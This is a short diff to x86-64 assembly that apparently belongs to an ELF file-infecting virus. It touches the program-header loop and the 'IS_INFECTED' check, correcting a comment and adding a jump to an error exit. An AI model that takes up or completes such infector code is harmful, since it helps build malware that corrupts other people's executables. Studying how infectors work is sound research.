@@ -220,11 +220,12 @@ _start:
     .not_executable:
     inc rbx ; add one to phdr loop counter
 
-    cmp bx, word [r15 + EHDR_PHNUM] ; have we looped through all ehdr ?
+    cmp bx, word [r15 + EHDR_PHNUM] ; have we looped through all phdr ?
     jl .continue_phdr_loop
 
     cmp byte [r15 + IS_INFECTED], 1 ; have we infected the file ?
     je cleanup ; done
+    jmp exit_error
 
     .continue_phdr_loop:
       add r8w, word [r15 + EHDR_PHENTSIZE] ; increment by ehdr_phentsize
